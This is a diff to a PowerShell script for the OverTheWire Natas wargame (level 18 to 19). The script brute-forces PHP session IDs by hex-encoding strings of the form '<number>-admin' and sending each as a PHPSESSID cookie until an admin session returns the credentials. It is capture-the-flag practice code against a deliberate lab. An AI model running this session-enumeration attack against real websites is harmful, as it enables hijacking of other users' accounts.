@@ -1,7 +1,7 @@
-$server = "natas18.natas.labs.overthewire.org"
-$url = "http://$server/index.php?debug"
+$server = "natas19.natas.labs.overthewire.org"
+$url = "http://$server/index.php"
 
-$username = "natas18"
+$username = "natas19"
 $password = "***REMOVED***"
 
 $pair = "${username}:${password}"
@@ -16,10 +16,28 @@ $headers = @{
 
 $correctStr = 'The credentials'
 
+
+
+function Convert-StringToHex { #yes this is from gpt 
+    param (
+        [string]$plainText
+    )
+
+    # Convert each character to its hexadecimal representation
+    $hexString = -join ($plainText.ToCharArray() | ForEach-Object { [byte][char]$_ -as [byte] } | ForEach-Object { $_.ToString("x2") })
+
+    return $hexString
+}
+
 for ($i = 1; $i -le 640; $i++) {
     write-host "Session: $i"
     $cookieContainer = New-Object System.Net.CookieContainer
-    $cookie = New-Object System.Net.Cookie("PHPSESSID", $i, "/", $server)
+
+    $plaintextcookie = "$i-admin"
+    $hexcookie = Convert-StringToHex -plaintext $plaintextcookie
+
+
+    $cookie = New-Object System.Net.Cookie("PHPSESSID", $hexcookie, "/", $server)
     $cookieContainer.Add($cookie)
     
     $requestSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession;
@@ -36,3 +54,4 @@ for ($i = 1; $i -le 640; $i++) {
     }
 
 }
+
